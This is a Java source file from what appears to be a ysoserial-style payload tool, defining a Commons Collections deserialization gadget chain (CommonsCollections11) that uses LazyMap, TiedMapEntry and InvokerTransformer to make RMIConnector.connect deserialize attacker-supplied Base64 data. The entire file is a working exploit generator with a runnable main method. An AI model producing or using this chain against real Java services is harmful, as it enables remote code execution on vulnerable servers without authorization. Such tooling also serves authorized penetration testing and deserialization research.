package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.utils.Reflections;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.util.HashMap;
import java.util.Map;

/**
 * RMIConnector 二次反序列化
 * 需要调用其 connect 方法，因此需要调用任意方法的 Gadget，这里选择了 InvokerTransformer
 * 直接传入 Base64 编码的序列化数据即可
 *
 * @author su18
 */
public class CommonsCollections11 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {

		JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
		Reflections.setFieldValue(jmxServiceURL, "urlPath", "/stub/" + command);
		RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

		InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

		HashMap<Object, Object> map          = new HashMap<Object, Object>();
		Map<Object, Object>     lazyMap      = LazyMap.decorate(map, new ConstantTransformer(1));
		TiedMapEntry            tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

		HashMap<Object, Object> expMap = new HashMap<Object, Object>();
		expMap.put(tiedMapEntry, "su18");
		lazyMap.remove(rmiConnector);

		Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

		return expMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections11.class, args);
	}
}
